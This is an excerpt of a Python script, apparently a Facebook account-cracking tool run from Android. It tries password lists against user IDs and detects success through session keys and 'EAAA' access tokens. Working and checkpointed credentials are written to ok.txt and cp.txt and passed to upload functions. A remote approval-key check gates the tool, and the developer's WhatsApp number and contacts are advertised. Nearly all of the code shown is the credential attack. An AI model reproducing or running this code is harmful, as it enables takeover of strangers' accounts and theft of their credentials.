...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://m.me/devikinge"])
	exit(" [*] FACEBOOK :  https://www.facebook.com/devikinge")
...
def notice():
	...
	runtxt("\033[0;92m ADMIN WHATSAPP >> +923263342276")
	subprocess.check_output(["am", "start", "https://wa.me/+923263342276"])
...
class Main:
	def __init__(self):
		...
		self.loop = 0
		try:
			plr = requests.get('https://raw.githubusercontent.com/Kickwinnerz/Approval/main/Approval.txt').text
			if basesplit in plr:
				key = basesplit
...
\033[0;92m╚═════╝ ╚══════╝  ╚═══╝  ╚═╝
 ...
 > \033[0;92mDEVELOPER     : Devi
 > \033[0;95mFACEBOOK ID   : Devi
 > \033[0;41mWHATSAPP      : 03263342276
 \033[0;96m> YOUTUBE       : Devikinge
 > \033[0;97mWARNING       : KNO SALAI KHARAP KAJE USE KORBI NA     
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s[>_] [Devi] : %s/%s -> \033[0;92m [ KHAN-OK:%s ]- \033[0;93m[KHAN-CP:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				...
				open("ok.txt","a").write(" [Devi-OK🥀] %s|%s\n"%(uid, pw))
				uploadoks()
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r \033[0;93m[Devi-CP🥺] %s|%s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write(" [Devi-CP🥺] %s|%s\n"%(uid, pw))
				uploadcps()
				break
			else:
				continue
